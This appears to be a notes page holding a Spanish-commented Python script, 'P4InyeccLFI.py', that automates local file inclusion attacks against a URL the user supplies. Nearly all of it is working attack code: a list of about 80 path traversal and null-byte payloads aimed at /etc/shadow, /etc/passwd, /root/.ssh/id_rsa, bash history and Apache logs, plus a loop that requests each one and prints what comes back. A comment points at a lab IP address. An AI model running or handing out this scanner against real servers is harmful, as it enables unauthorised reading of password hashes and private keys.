# 👹 INYECCION DE RUTAS PARA BUSCAR INFO POR LFI                                     P4InyeccLFI.py

````python
// Some code

```python
#! programa para realizar inyecciones de rutas para vulnerabilidades de LFI - P4InyeccLFI.py - By P4IM0N

#?-----------------------------------------------------------------------------------------
#LIBRERIAS
import requests
from bs4 import BeautifulSoup
from tabulate import tabulate 

#?-----------------------------------------------------------------------------------------
#COLORES
COLOR_ROJO = "\033[91m"
COLOR_VERDE = "\033[92m"
COLOR_VIOLETA = "\033[95m"
COLOR_TURQUESA = "\033[96m"
COLOR_RESET = "\033[0m"

#?-----------------------------------------------------------------------------------------
#BANNER
banner = f'''

__________  _____ .___                                 .____   ___________.___ 
\______   \/  |  ||   | ____ ___.__. ____   ____  ____ |    |  \_   _____/|   |
 |     ___/   |  ||   |/    <   |  |/ __ \_/ ___\/ ___\|    |   |    __)  |   |
 {COLOR_TURQUESA}|    |  /    ^   /   |   |  \___  \  ___/\  \__\  \___|    |___|     \   |   |{COLOR_RESET}
 |____|  \____   ||___|___|  / ____|\___  >\___  >___  >_______ \___  /   |___|
              |__|         \/\/         \/     \/    \/        \/   \/         
{COLOR_VIOLETA}By P4IM0N{COLOR_RESET}'''
print(banner)

#?-----------------------------------------------------------------------------------------
#PAYLOAD LFI
payload_LFI = ['/etc/passwd',
                 '/etc/passwd%00',
  '../../../../../../etc/passwd', 
  '../../../../../../etc/passwd%00', 
  '..././..././..././..././..././etc/passwd',
  '..././..././..././..././..././etc/passwd%00',
  '....//....//....//....//....//etc/passwd',
  '....//....//....//....//....//etc/passwd%00',
  '/etc/issue',
  '/etc/issue%00',
  '../../../../../../etc/issue',
  '../../../../../../etc/issue%00',
  '..././..././..././..././..././etc/issue',
  '..././..././..././..././..././etc/issue%00',
  '....//....//....//....//....//etc/issue',
  '....//....//....//....//....//etc/issue%00',
  '/etc/profile',
  '/etc/profile%00',
  '../../../../../../etc/profile',
  '../../../../../../etc/profile%00',
  '..././..././..././..././..././etc/profile',
  '..././..././..././..././..././etc/profile%00',
  '....//....//....//....//....//etc/profile',
  '....//....//....//....//....//etc/profile%00',
  '/proc/version',
  '/proc/version%00',
  '../../../../../../proc/version',
  '../../../../../../proc/version%00',
  '..././..././..././..././..././proc/version',
  '..././..././..././..././..././proc/version%00',
  '....//....//....//....//....//proc/version',
  '....//....//....//....//....//proc/version%00',
  '/etc/shadow',
  '/etc/shadow%00',
  '../../../../../../etc/shadow',
  '../../../../../../etc/shadow%00',
  '..././..././..././..././..././etc/shadow',
  '..././..././..././..././..././etc/shadow%00',
  '....//....//....//....//....//etc/shadow',
  '....//....//....//....//....//etc/shadow%00',
  '/root/.bash_history',
  '/root/.bash_history%00',
  '../../../../../../root/.bash_history',
  '../../../../../../root/.bash_history%00',
  '..././..././..././..././..././root/.bash_history',
  '..././..././..././..././..././root/.bash_history%00',
  '....//....//....//....//....//root/.bash_history',
  '....//....//....//....//....//root/.bash_history%00',
  '/var/log/dmessage',
  '/var/log/dmessage%00',
  '../../../../../../var/log/dmessage',
  '../../../../../../var/log/dmessage%00',
  '..././..././..././..././..././var/log/dmessage',
  '..././..././..././..././..././var/log/dmessage%00',
  '....//....//....//....//....//var/log/dmessage',
  '....//....//....//....//....//var/log/dmessage%00',
  '/var/mail/root',
  '/var/mail/root%00',
  '../../../../../../var/mail/root',
  '../../../../../../var/mail/root%00',
  '..././..././..././..././..././var/mail/root',
  '..././..././..././..././..././var/mail/root%00',
  '....//....//....//....//....//var/mail/root',
  '....//....//....//....//....//var/mail/root%00',
  '/root/.ssh/id_rsa',
  '/root/.ssh/id_rsa%00',
  '../../../../../../root/.ssh/id_rsa',
  '../../../../../../root/.ssh/id_rsa%00',
  '..././..././..././..././..././root/.ssh/id_rsa',
  '..././..././..././..././..././root/.ssh/id_rsa%00',
  '....//....//....//....//....//root/.ssh/id_rsa',
  '....//....//....//....//....//root/.ssh/id_rsa%00',
  '/var/log/apache2/access.log',
  '/var/log/apache2/access.log%00',
  '../../../../../../var/log/apache2/access.log',
  '../../../../../../var/log/apache2/access.log%00',
  '..././..././..././..././..././var/log/apache2/access.log',
  '..././..././..././..././..././var/log/apache2/access.log%00',
  '....//....//....//....//....//var/log/apache2/access.log',
  '....//....//....//....//....//var/log/apache2/access.log%00',
  'C:\boot.ini']
#?-----------------------------------------------------------------------------------------
#FUNCION MAIN
def main():
    objetivo = input('Manito dame la URL OBJETIVO a la que le realizaremos pruebas de LFI: ')
    
    if objetivo:
        print(f'{COLOR_TURQUESA}//////////////////////////////////////////////////////////////////////////////////////{COLOR_RESET}')
        print(objetivo)
        print(f'{COLOR_TURQUESA}//////////////////////////////////////////////////////////////////////////////////////{COLOR_RESET}')
        try:
            for pload in payload_LFI:
                prueba_objetivo_LFI = requests.get(objetivo+pload)
                resultado_LFI = BeautifulSoup(prueba_objetivo_LFI.text, 'html5lib')
                for linea in resultado_LFI.find_all('code'):
                    if '/var/www/html' not in linea:
                        
                        if 'Warning:' in linea.text:
                            resultado_negativo_LFI = []
                            resultado_negativo_LFI.append([linea.text])
                            tabla_negativa = tabulate(resultado_negativo_LFI, [pload], tablefmt='grid')
                            print(COLOR_ROJO+tabla_negativa+COLOR_RESET)
                            print(f'{COLOR_VIOLETA}//////////////////////////////////////////////////////////////////////////////////////{COLOR_RESET}')
                            
                        else:
                            resultado_positivo_LFI = []
                            resultado_positivo_LFI.append([linea.text])
                            tabla_positivo = tabulate(resultado_positivo_LFI, [pload], tablefmt='grid')
                            print(COLOR_VERDE+tabla_positivo+COLOR_RESET)
                            print(f'{COLOR_VIOLETA}//////////////////////////////////////////////////////////////////////////////////////{COLOR_RESET}')
                            
                            
        except TypeError as error:
            print(f'Manito ocurrio este error: {error}')        
    
#http://10.10.166.228/lab1.php?file=
#?-----------------------------------------------------------------------------------------
#EJECUCION
if __name__=='__main__':
    try: 
        main()
    except KeyboardInterrupt:
        print('Gracias manioto por usar mi programa   :D')
        exit()    

#?-----------------------------------------------------------------------------------------


```
````
